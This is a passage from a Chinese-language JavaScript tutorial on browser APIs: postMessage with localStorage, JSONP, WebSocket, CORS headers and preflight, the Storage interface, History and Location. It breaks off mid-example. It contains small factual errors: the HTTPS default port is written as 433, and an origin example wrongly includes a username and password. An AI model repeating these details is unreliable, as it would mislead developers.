LocalStorage
~~~~~~~~~~~~~

   通过 ``window.postMessage`` ，读写其他窗口的 LocalStorage 也成为了可能。

   下面是一个例子，主窗口写入 iframe 子窗口的 ``localStorage`` 。

   .. code:: javascript

      window.onmessage = function(e) {
        if (e.origin !== 'http://bbb.com') {
          return;
        }
        var payload = JSON.parse(e.data);
        localStorage.setItem(payload.key, JSON.stringify(payload.data));
      };

   上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。

   父窗口发送消息的代码如下。

   .. code:: javascript

      var win = document.getElementsByTagName('iframe')[0].contentWindow;
      var obj = { name: 'Jack' };
      win.postMessage(
        JSON.stringify({key: 'storage', data: obj}),
        'http://bbb.com'
      );

   加强版的子窗口接收消息的代码如下。

   .. code:: javascript

      window.onmessage = function(e) {
        if (e.origin !== 'http://bbb.com') return;
        var payload = JSON.parse(e.data);
        switch (payload.method) {
          case 'set':
            localStorage.setItem(payload.key, JSON.stringify(payload.data));
            break;
          case 'get':
            var parent = window.parent;
            var data = localStorage.getItem(payload.key);
            parent.postMessage(data, 'http://aaa.com');
            break;
          case 'remove':
            localStorage.removeItem(payload.key);
            break;
        }
      };

   加强版的父窗口发送消息代码如下。

   .. code:: javascript

      var win = document.getElementsByTagName('iframe')[0].contentWindow;
      var obj = { name: 'Jack' };
      // 存入对象
      win.postMessage(
        JSON.stringify({key: 'storage', method: 'set', data: obj}),
        'http://bbb.com'
      );
      // 读取对象
      win.postMessage(
        JSON.stringify({key: 'storage', method: "get"}),
        "*"
      );
      window.onmessage = function(e) {
        if (e.origin != 'http://aaa.com') return;
        console.log(JSON.parse(e.data).name);
      };

AJAX
-----

   同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。

   除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。

   > - JSONP
   > - WebSocket
   > - CORS

JSONP
~~~~~~

   JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。

   它的做法如下。

   第一步，网页添加一个 ``<script>`` 元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。

   .. code:: html

      <script src="http://api.foo.com?callback=bar"></script>

   注意，请求的脚本网址有一个 ``callback`` 参数（ ``?callback=bar`` ），用来告诉服务器，客户端的回调函数名称（ ``bar`` ）。

   第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（ ``bar({...})`` ）。

   第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是 ``<script>`` 标签请求的脚本内容。这时，客户端只要定义了 ``bar()`` 函数，就能在该函数体内，拿到服务器返回的 JSON 数据。

   下面看一个实例。首先，网页动态插入 ``<script>`` 元素，由它向跨域网址发出请求。

   .. code:: javascript

      function addScriptTag(src) {
        var script = document.createElement('script');
        script.setAttribute('type', 'text/javascript');
        script.src = src;
        document.body.appendChild(script);
      }
   
      window.onload = function () {
        addScriptTag('http://example.com/ip?callback=foo');
      }
   
      function foo(data) {
        console.log('Your public IP address is: ' + data.ip);
      };

   上面代码通过动态添加 ``<script>`` 元素，向服务器 ``example.com`` 发出请求。注意，该请求的查询字符串有一个 ``callback`` 参数，用来指定回调函数的名字，这对于 JSONP 是必需的。

   服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。

   .. code:: javascript

      foo({
        'ip': '8.8.8.8'
      });

   由于 ``<script>`` 元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了 ``foo`` 函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用 ``JSON.parse`` 的步骤。

WebSocket
~~~~~~~~~~

   WebSocket 是一种通信协议，使用 ``ws://`` （非加密）和 ``wss://`` （加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

   下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自[维基百科](https://en.wikipedia.org/wiki/WebSocket)）。

   .. code:: http

      GET /chat HTTP/1.1
      Host: server.example.com
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
      Sec-WebSocket-Protocol: chat, superchat
      Sec-WebSocket-Version: 13
      Origin: http://example.com

   上面代码中，有一个字段是 ``Origin`` ，表示该请求的请求源（origin），即发自哪个域名。

   正是因为有了 ``Origin`` 这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。

   .. code:: http

      HTTP/1.1 101 Switching Protocols
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
      Sec-WebSocket-Protocol: chat

CORS
~~~~~

   CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发 ``GET`` 请求，CORS 允许任何类型的请求。

   下一章将详细介绍，如何通过 CORS 完成跨源 AJAX 请求。

参考链接
-------

   - Mozilla Developer Network, [Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/window.postMessage)
   - Jakub Jankiewicz, [Cross-Domain LocalStorage](http://jcubic.wordpress.com/2014/06/20/cross-domain-localstorage/)
   - David Baron, [setTimeout with a shorter delay](http://dbaron.org/log/20100309-faster-timeouts): 利用 window.postMessage 可以实现0毫秒触发回调函数

/🟠 CORS 通信
=============

   CORS 是一个 W3C 标准，全称是“跨源资源共享”（Cross-origin resource sharing），或者通俗地称为“跨域资源共享”。它允许浏览器向跨源的服务器，发出 ``XMLHttpRequest`` 请求，从而克服了 AJAX 只能同源使用的限制。

简介
---

   CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。

   整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。

两种请求
-------

   CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。

   只要同时满足以下两大条件，就属于简单请求。

   （1）请求方法是以下三种方法之一。

   > - HEAD
   > - GET
   > - POST

   （2）HTTP 的头信息不超出以下几种字段。

   > - Accept
   > - Accept-Language
   > - Content-Language
   > - Last-Event-ID
   > - Content-Type：只限于三个值 ``application/x-www-form-urlencoded`` 、 ``multipart/form-data`` 、 ``text/plain`` 

   凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。

   这样划分的原因是，表单在历史上一直可以跨源发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。

简单请求
-------


基本流程
~~~~~~~

   对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个 ``Origin`` 字段。

   下面是一个例子，浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个 ``Origin`` 字段。

   .. code:: http

      GET /cors HTTP/1.1
      Origin: http://api.bob.com
      Host: api.alice.com
      Accept-Language: en-US
      Connection: keep-alive
      User-Agent: Mozilla/5.0...

   上面的头信息中， ``Origin`` 字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。

   如果 ``Origin`` 指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 ``Access-Control-Allow-Origin`` 字段（详见下文），就知道出错了，从而抛出一个错误，被 ``XMLHttpRequest`` 的 ``onerror`` 回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。

   如果 ``Origin`` 指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。

   .. code:: http

      Access-Control-Allow-Origin: http://api.bob.com
      Access-Control-Allow-Credentials: true
      Access-Control-Expose-Headers: FooBar
      Content-Type: text/html; charset=utf-8

   上面的头信息之中，有三个与 CORS 请求相关的字段，都以 ``Access-Control-`` 开头。

   **（1） ``Access-Control-Allow-Origin`` **

   该字段是必须的。它的值要么是请求时 ``Origin`` 字段的值，要么是一个 ``*`` ，表示接受任意域名的请求。

   **（2） ``Access-Control-Allow-Credentials`` **

   该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为 ``true`` ，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为 ``true`` ，如果服务器不要浏览器发送 Cookie，不发送该字段即可。

   **（3） ``Access-Control-Expose-Headers`` **

   该字段可选。CORS 请求时， ``XMLHttpRequest`` 对象的 ``getResponseHeader()`` 方法只能拿到6个服务器返回的基本字段： ``Cache-Control`` 、 ``Content-Language`` 、 ``Content-Type`` 、 ``Expires`` 、 ``Last-Modified`` 、 ``Pragma`` 。如果想拿到其他字段，就必须在 ``Access-Control-Expose-Headers`` 里面指定。上面的例子指定， ``getResponseHeader('FooBar')`` 可以返回 ``FooBar`` 字段的值。

withCredentials 属性
~~~~~~~~~~~~~~~~~~~

   上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定 ``Access-Control-Allow-Credentials`` 字段，告诉浏览器可以发送 Cookie。

   .. code:: http

      Access-Control-Allow-Credentials: true

   同时，开发者必须在 AJAX 请求中打开 ``withCredentials`` 属性。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.withCredentials = true;

   否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。

   但是，有的浏览器默认将 ``withCredentials`` 属性设为 ``true`` 。这导致如果省略 ``withCredentials`` 设置，这些浏览器可能还是会一起发送 Cookie。这时，可以显式关闭 ``withCredentials`` 。

   .. code:: javascript

      xhr.withCredentials = false;

   需要注意的是，如果服务器要求浏览器发送 Cookie， ``Access-Control-Allow-Origin`` 就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 ``document.cookie`` 也无法读取服务器域名下的 Cookie。

非简单请求
--------


预检请求
~~~~~~~

   非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是 ``PUT`` 或 ``DELETE`` ，或者 ``Content-Type`` 字段的类型是 ``application/json`` 。

   非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的 ``XMLHttpRequest`` 请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量 ``DELETE`` 和 ``PUT`` 请求，这些传统的表单不可能跨源发出的请求。

   下面是一段浏览器的 JavaScript 脚本。

   .. code:: javascript

      var url = 'http://api.alice.com/cors';
      var xhr = new XMLHttpRequest();
      xhr.open('PUT', url, true);
      xhr.setRequestHeader('X-Custom-Header', 'value');
      xhr.send();

   上面代码中，HTTP 请求的方法是 ``PUT`` ，并且发送一个自定义头信息 ``X-Custom-Header`` 。

   浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。

   .. code:: http

      OPTIONS /cors HTTP/1.1
      Origin: http://api.bob.com
      Access-Control-Request-Method: PUT
      Access-Control-Request-Headers: X-Custom-Header
      Host: api.alice.com
      Accept-Language: en-US
      Connection: keep-alive
      User-Agent: Mozilla/5.0...

   “预检”请求用的请求方法是 ``OPTIONS`` ，表示这个请求是用来询问的。头信息里面，关键字段是 ``Origin`` ，表示请求来自哪个源。

   除了 ``Origin`` 字段，“预检”请求的头信息包括两个特殊字段。

   **（1） ``Access-Control-Request-Method`` **

   该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 ``PUT`` 。

   **（2） ``Access-Control-Request-Headers`` **

   该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 ``X-Custom-Header`` 。

预检请求的回应
~~~~~~~~~~~~

   服务器收到“预检”请求以后，检查了 ``Origin`` 、 ``Access-Control-Request-Method`` 和 ``Access-Control-Request-Headers`` 字段以后，确认允许跨源请求，就可以做出回应。

   .. code:: http

      HTTP/1.1 200 OK
      Date: Mon, 01 Dec 2008 01:15:39 GMT
      Server: Apache/2.0.61 (Unix)
      Access-Control-Allow-Origin: http://api.bob.com
      Access-Control-Allow-Methods: GET, POST, PUT
      Access-Control-Allow-Headers: X-Custom-Header
      Content-Type: text/html; charset=utf-8
      Content-Encoding: gzip
      Content-Length: 0
      Keep-Alive: timeout=2, max=100
      Connection: Keep-Alive

   上面的 HTTP 回应中，关键的是 ``Access-Control-Allow-Origin`` 字段，表示 ``http://api.bob.com`` 可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。

   .. code:: http

      Access-Control-Allow-Origin: *

   如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。

   .. code:: http

      OPTIONS http://api.bob.com HTTP/1.1
      Status: 200
      Access-Control-Allow-Origin: https://notyourdomain.com
      Access-Control-Allow-Method: POST

   上面的服务器回应， ``Access-Control-Allow-Origin`` 字段明确不包括发出请求的 ``http://api.bob.com`` 。

   这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 ``XMLHttpRequest`` 对象的 ``onerror`` 回调函数捕获。控制台会打印出如下的报错信息。

   .. code:: bash

      XMLHttpRequest cannot load http://api.alice.com.
      Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.

   服务器回应的其他 CORS 相关字段如下。

   .. code:: http

      Access-Control-Allow-Methods: GET, POST, PUT
      Access-Control-Allow-Headers: X-Custom-Header
      Access-Control-Allow-Credentials: true
      Access-Control-Max-Age: 1728000

   **（1） ``Access-Control-Allow-Methods`` **

   该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨源请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。

   **（2） ``Access-Control-Allow-Headers`` **

   如果浏览器请求包括 ``Access-Control-Request-Headers`` 字段，则 ``Access-Control-Allow-Headers`` 字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。

   **（3） ``Access-Control-Allow-Credentials`` **

   该字段与简单请求时的含义相同。

   **（4） ``Access-Control-Max-Age`` **

   该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。

浏览器的正常请求和回应
~~~~~~~~~~~~~~~~~~

   一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 ``Origin`` 头信息字段。服务器的回应，也都会有一个 ``Access-Control-Allow-Origin`` 头信息字段。

   下面是“预检”请求之后，浏览器的正常 CORS 请求。

   .. code:: http

      PUT /cors HTTP/1.1
      Origin: http://api.bob.com
      Host: api.alice.com
      X-Custom-Header: value
      Accept-Language: en-US
      Connection: keep-alive
      User-Agent: Mozilla/5.0...

   上面头信息的 ``Origin`` 字段是浏览器自动添加的。

   下面是服务器正常的回应。

   .. code:: http

      Access-Control-Allow-Origin: http://api.bob.com
      Content-Type: text/html; charset=utf-8

   上面头信息中， ``Access-Control-Allow-Origin`` 字段是每次回应都必定包含的。

与 JSONP 的比较
--------------

   CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持 ``GET`` 请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。

参考链接
-------

   - [Using CORS](http://www.html5rocks.com/en/tutorials/cors/), Monsur Hossain
   - [HTTP access control (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS), MDN
   - [CORS](https://frontendian.co/cors), Ryan Miller
   - [Do You Really Know CORS?](http://performantcode.com/web/do-you-really-know-cors), Grzegorz Mirek

/🟠 Storage 接口
================

概述
---

   Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口： ``window.sessionStorage`` 和 ``window.localStorage`` 。

    ``sessionStorage`` 保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空； ``localStorage`` 保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。

   保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。

   这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中， ``a.example.com`` 和 ``b.example.com`` 共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。

属性和方法
--------

   Storage 接口只有一个属性。

   -  ``Storage.length`` ：返回保存的数据项个数。

   .. code:: javascript

      window.localStorage.setItem('foo', 'a');
      window.localStorage.setItem('bar', 'b');
      window.localStorage.setItem('baz', 'c');
   
      window.localStorage.length // 3

   该接口提供5个方法。

Storage.setItem()
~~~~~~~~~~~~~~~~~~

    ``Storage.setItem()`` 方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。

   .. code:: javascript

      window.sessionStorage.setItem('key', 'value');
      window.localStorage.setItem('key', 'value');

   注意， ``Storage.setItem()`` 两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。

   .. code:: javascript

      window.sessionStorage.setItem(3, { foo: 1 });
      window.sessionStorage.getItem('3') // "[object Object]"

   上面代码中， ``setItem`` 方法的两个参数都不是字符串，但是存入的值都是字符串。

   如果储存空间已满，该方法会抛错。

   写入不一定要用这个方法，直接赋值也是可以的。

   .. code:: javascript

      // 下面三种写法等价
      window.localStorage.foo = '123';
      window.localStorage['foo'] = '123';
      window.localStorage.setItem('foo', '123');

Storage.getItem()
~~~~~~~~~~~~~~~~~~

    ``Storage.getItem()`` 方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回 ``null`` 。

   .. code:: javascript

      window.sessionStorage.getItem('key')
      window.localStorage.getItem('key')

   键名应该是一个字符串，否则会被自动转为字符串。

Storage.removeItem()
~~~~~~~~~~~~~~~~~~~~~

    ``Storage.removeItem()`` 方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。

   .. code:: javascript

      sessionStorage.removeItem('key');
      localStorage.removeItem('key');

Storage.clear()
~~~~~~~~~~~~~~~~

    ``Storage.clear()`` 方法用于清除所有保存的数据。该方法的返回值是 ``undefined`` 。

   .. code:: javascript

      window.sessionStorage.clear()
      window.localStorage.clear()

Storage.key()
~~~~~~~~~~~~~~

    ``Storage.key()`` 方法接受一个整数作为参数（从零开始），返回该位置对应的键名。

   .. code:: javascript

      window.sessionStorage.setItem('key', 'value');
      window.sessionStorage.key(0) // "key"

   结合使用 ``Storage.length`` 属性和 ``Storage.key()`` 方法，可以遍历所有的键。

   .. code:: javascript

      for (var i = 0; i < window.localStorage.length; i++) {
        console.log(localStorage.key(i));
      }

storage 事件
-----------

   Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。

   .. code:: javascript

      window.addEventListener('storage', onStorageChange);

   监听函数接受一个 ``event`` 实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。

   -  ``StorageEvent.key`` ：字符串，表示发生变动的键名。如果 storage 事件是由 ``clear()`` 方法引起，该属性返回 ``null`` 。
   -  ``StorageEvent.newValue`` ：字符串，表示新的键值。如果 storage 事件是由 ``clear()`` 方法或删除该键值对引发的，该属性返回 ``null`` 。
   -  ``StorageEvent.oldValue`` ：字符串，表示旧的键值。如果该键值对是新增的，该属性返回 ``null`` 。
   -  ``StorageEvent.storageArea`` ：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。
   -  ``StorageEvent.url`` ：字符串，表示原始触发 storage 事件的那个网页的网址。

   下面是 ``StorageEvent.key`` 属性的例子。

   .. code:: javascript

      function onStorageChange(e) {
        console.log(e.key);
      }
   
      window.addEventListener('storage', onStorageChange);

   注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。

参考链接
-------

   - Ryan Stewart，[Introducing the HTML5 storage APIs](http://www.adobe.com/devnet/html5/articles/html5-storage-apis.html)
   - [Getting Started with LocalStorage](http://codular.com/localstorage)
   - Feross Aboukhadijeh, [Introducing the HTML5 Hard Disk Filler™ API](http://feross.org/fill-disk/)
   - Ben Summers, [Inter-window messaging using localStorage](http://bens.me.uk/2013/localstorage-inter-window-messaging)
   - Stack Overflow, [Why does Internet Explorer fire the window “storage” event on the window that stored the data?](http://stackoverflow.com/questions/18265556/why-does-internet-explorer-fire-the-window-storage-event-on-the-window-that-st)
   - Stack Overflow, [localStorage eventListener is not called](https://stackoverflow.com/questions/5370784/localstorage-eventlistener-is-not-called)

/🟠 History 对象
================

概述
---

    ``window.history`` 属性指向 History 对象，它表示当前窗口的浏览历史。

   History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。

   .. code:: javascript

      window.history.length // 3

   由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。

   .. code:: javascript

      // 后退到前一个网址
      history.back()
   
      // 等同于
      history.go(-1)

   浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。

属性
---

   History 对象主要有两个属性。

   -  ``History.length`` ：当前窗口访问过的网址数量（包括当前网页）
   -  ``History.state`` ：History 堆栈最上层的状态值（详见下文）

   .. code:: javascript

      // 当前窗口访问过多少个网页
      window.history.length // 1
   
      // History 对象的当前状态
      // 通常是 undefined，即未设置
      window.history.state // undefined

方法
---


History.back()、History.forward()、History.go()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   这三个方法用于在历史之中移动。

   -  ``History.back()`` ：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。
   -  ``History.forward()`` ：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。
   -  ``History.go()`` ：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如 ``go(1)`` 相当于 ``forward()`` ， ``go(-1)`` 相当于 ``back()`` 。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为 ``0`` ，相当于刷新当前页面。

   .. code:: javascript

      history.back();
      history.forward();
      history.go(-2);

    ``history.go(0)`` 相当于刷新当前页面。

   .. code:: javascript

      history.go(0); // 刷新当前页面

   注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。

History.pushState()
~~~~~~~~~~~~~~~~~~~~

    ``History.pushState()`` 方法用于在历史中添加一条记录。

   .. code:: javascript

      window.history.pushState(state, title, url)

   该方法接受三个参数，依次为：

   -  ``state`` ：一个与添加的记录相关联的状态对象，主要用于 ``popstate`` 事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填 ``null`` 。
   -  ``title`` ：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。
   -  ``url`` ：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。

   假定当前网址是 ``example.com/1.html`` ，使用 ``pushState()`` 方法在浏览记录（History 对象）中添加一个新记录。

   .. code:: javascript

      var stateObj = { foo: 'bar' };
      history.pushState(stateObj, 'page 2', '2.html');

   添加新记录后，浏览器地址栏立刻显示 ``example.com/2.html`` ，但并不会跳转到 ``2.html`` ，甚至也不会检查 ``2.html`` 是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问 ``google.com`` )，然后点击了倒退按钮，页面的 URL 将显示 ``2.html`` ；你再点击一次倒退按钮，URL 将显示 ``1.html`` 。

   总之， ``pushState()`` 方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。

   使用该方法之后，就可以用 ``History.state`` 属性读出状态对象。

   .. code:: javascript

      var stateObj = { foo: 'bar' };
      history.pushState(stateObj, 'page 2', '2.html');
      history.state // {foo: "bar"}

   如果 ``pushState`` 的 URL 参数设置了一个新的锚点值（即 ``hash`` ），并不会触发 ``hashchange`` 事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。

   如果 ``pushState()`` 方法设置了一个跨域网址，则会报错。

   .. code:: javascript

      // 报错
      // 当前网址为 http://example.com
      history.pushState(null, '', 'https://twitter.com/hello');

   上面代码中， ``pushState`` 想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。

History.replaceState()
~~~~~~~~~~~~~~~~~~~~~~~

    ``History.replaceState()`` 方法用来修改 History 对象的当前记录，其他都与 ``pushState()`` 方法一模一样。

   假定当前网页是 ``example.com/example.html`` 。

   .. code:: javascript

      history.pushState({page: 1}, 'title 1', '?page=1')
      // URL 显示为 http://example.com/example.html?page=1
   
      history.pushState({page: 2}, 'title 2', '?page=2');
      // URL 显示为 http://example.com/example.html?page=2
   
      history.replaceState({page: 3}, 'title 3', '?page=3');
      // URL 显示为 http://example.com/example.html?page=3
   
      history.back()
      // URL 显示为 http://example.com/example.html?page=1
   
      history.back()
      // URL 显示为 http://example.com/example.html
   
      history.go(2)
      // URL 显示为 http://example.com/example.html?page=3

popstate 事件
------------

   每当同一个文档的浏览历史（即 ``history`` 对象）出现变化时，就会触发 ``popstate`` 事件。

   注意，仅仅调用 ``pushState()`` 方法或 ``replaceState()`` 方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用 ``History.back()`` 、 ``History.forward()`` 、 ``History.go()`` 方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。

   使用的时候，可以为 ``popstate`` 事件指定回调函数。

   .. code:: javascript

      window.onpopstate = function (event) {
        console.log('location: ' + document.location);
        console.log('state: ' + JSON.stringify(event.state));
      };
   
      // 或者
      window.addEventListener('popstate', function(event) {
        console.log('location: ' + document.location);
        console.log('state: ' + JSON.stringify(event.state));
      });

   回调函数的参数是一个 ``event`` 事件对象，它的 ``state`` 属性指向 ``pushState`` 和 ``replaceState`` 方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的 ``event.state`` ，就是通过 ``pushState`` 和 ``replaceState`` 方法，为当前 URL 绑定的 ``state`` 对象。

   这个 ``state`` 对象也可以直接通过 ``history`` 对象读取。

   .. code:: javascript

      var currentState = history.state;

   注意，页面第一次加载的时候，浏览器不会触发 ``popstate`` 事件。

/🟠 Location 对象，URL 对象，URLSearchParams 对象
==============================================

   URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。

Location 对象
------------

    ``Location`` 对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过 ``window.location`` 和 ``document.location`` 属性，可以拿到这个对象。

属性
~~~

    ``Location`` 对象提供以下属性。

   -  ``Location.href`` ：整个 URL。
   -  ``Location.protocol`` ：当前 URL 的协议，包括冒号（ ``:`` ）。
   -  ``Location.host`` ：主机。如果端口不是协议默认的 ``80`` 和 ``433`` ，则还会包括冒号（ ``:`` ）和端口。
   -  ``Location.hostname`` ：主机名，不包括端口。
   -  ``Location.port`` ：端口号。
   -  ``Location.pathname`` ：URL 的路径部分，从根路径 ``/`` 开始。
   -  ``Location.search`` ：查询字符串部分，从问号 ``?`` 开始。
   -  ``Location.hash`` ：片段字符串部分，从 ``#`` 开始。
   -  ``Location.username`` ：域名前面的用户名。
   -  ``Location.password`` ：域名前面的密码。
   -  ``Location.origin`` ：URL 的协议、主机名和端口。

   .. code:: javascript

      // 当前网址为
      // http://user:passwd@www.example.com:4097/path/a.html?x=111#part1
      document.location.href
      // "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
      document.location.protocol
      // "http:"
      document.location.host
      // "www.example.com:4097"
      document.location.hostname
      // "www.example.com"
      document.location.port
      // "4097"
      document.location.pathname
      // "/path/a.html"
      document.location.search
      // "?x=111"
      document.location.hash
      // "#part1"
      document.location.username
      // "user"
      document.location.password
      // "passwd"
      document.location.origin
      // "http://user:passwd@www.example.com:4097"

   这些属性里面，只有 ``origin`` 属性是只读的，其他属性都可写。

   注意，如果对 ``Location.href`` 写入新的 URL 地址，浏览器会立刻跳转到这个新地址。

   .. code:: javascript

      // 跳转到新网址
      document.location.href = 'http://www.example.com';

   这个特性常常用于让网页自动滚动到新的锚点。

   .. code:: javascript

      document.location.href = '#top';
      // 等同于
      document.location.hash = '#top';

   直接改写 ``location`` ，相当于写入 ``href`` 属性。

   .. code:: javascript

      document.location = 'http://www.example.com';
      // 等同于
